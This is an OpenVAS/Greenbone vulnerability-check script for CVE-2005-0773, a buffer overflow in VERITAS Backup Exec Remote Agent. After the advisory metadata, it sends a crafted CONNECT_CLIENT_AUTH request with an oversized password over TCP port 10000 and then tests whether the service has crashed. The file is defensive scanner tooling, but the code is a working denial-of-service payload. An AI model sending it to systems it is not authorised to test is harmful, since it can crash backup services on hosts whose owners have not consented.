if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802985" );
	script_version( "2019-05-10T14:24:23+0000" );
	script_cve_id( "CVE-2005-0773" );
	script_bugtraq_id( 14022 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2019-05-10 14:24:23 +0000 (Fri, 10 May 2019)" );
	script_tag( name: "creation_date", value: "2012-10-15 10:32:37 +0530 (Mon, 15 Oct 2012)" );
	script_name( "VERITAS Backup Exec Remote Agent Windows Servers BOF Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (c) 2012 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc", "os_detection.sc" );
	script_require_ports( 10000 );
	script_mandatory_keys( "Host/runs_windows" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/15789" );
	script_xref( name: "URL", value: "http://securitytracker.com/id?1014273" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/492105" );
	script_xref( name: "URL", value: "http://www.us-cert.gov/cas/techalerts/TA05-180A.html" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/vulnwatch/2005-q2/0073.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to overflow a buffer and
  execute arbitrary code on the system." );
	script_tag( name: "affected", value: "Veritas Backup Exec Remote Agent versions 9.0 through 10.0 for Windows Servers" );
	script_tag( name: "insight", value: "The flaw is due to insufficient input validation on CONNECT_CLIENT_AUTH
  requests. CONNECT_CLIENT_AUTH requests sent with an authentication method type
  '3' indicating Windows user credentials, and an overly long password argument
  can overflow the buffer and lead to arbitrary code execution." );
	script_tag( name: "solution", value: "Upgrade to Veritas Backup Exec Remote Agent 10.0 rev. 5520 for Windows Servers" );
	script_tag( name: "summary", value: "This host is running VERITAS Backup Exec Remote Agent for Windows
  Servers and is prone to buffer overflow vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
port = 10000;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
buf = recv( socket: soc, length: 40 );
if(!buf || !IsMatchRegexp( hexstr( buf ), "^80000024" )){
	close( soc );
	exit( 0 );
}
req = raw_string( 0x80, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01, 0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03 );
send( socket: soc, data: req );
buf = recv( socket: soc, length: 32 );
if(!buf || !IsMatchRegexp( hexstr( buf ), "^8000001c" )){
	close( soc );
	exit( 0 );
}
req = raw_string( 0x80, 0x00, 0x04, 0x3E, 0x00, 0x00, 0x00, 0x02, 0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00 ) + crap( data: "A", length: 0x400 ) + raw_string( 0x00, 0x00, 0x00, 0x04, 0x04 );
send( socket: soc, data: req );
close( soc );
sleep( 5 );
soc = open_sock_tcp( port );
if(!soc){
	security_message( port );
	exit( 0 );
}
close( soc );

